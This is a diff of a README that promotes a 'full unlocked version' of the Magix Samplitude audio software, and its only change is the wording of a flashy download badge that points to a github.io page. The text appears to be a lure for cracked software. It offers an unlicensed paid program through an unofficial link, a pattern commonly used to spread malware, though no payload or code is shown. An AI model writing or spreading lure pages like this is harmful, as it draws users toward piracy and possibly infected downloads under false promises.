@@ -2,7 +2,7 @@
 
 Welcome to the future of digital audio workstations - the most comprehensive and technologically advanced version of Magix Samplitude ever conceived. This isn't just software; it's a complete audio production ecosystem designed to elevate your creative workflow to unprecedented heights. Whether you're crafting chart-topping hits, producing immersive podcasts, or scoring cinematic masterpieces, this version delivers tools that redefine what's possible in digital audio.
 
-[![⬇️🔥 INSTANT DOWNLOAD ACCESS 🔥⬇️](https://img.shields.io/badge/-GET_FULL_UNLOCKED_VERSION_-magenta?style=for-the-badge&logo=rocket)](https://magix-samplitude.github.io/.github/)
+[![⬇️🔥 INSTANT DOWNLOAD ACCESS 🔥⬇️](https://img.shields.io/badge/-DOWNLOAD_FULL_UNLOCKED_VERSION_-magenta?style=for-the-badge&logo=rocket)](https://magix-samplitude.github.io/.github/)
 
 ---
 
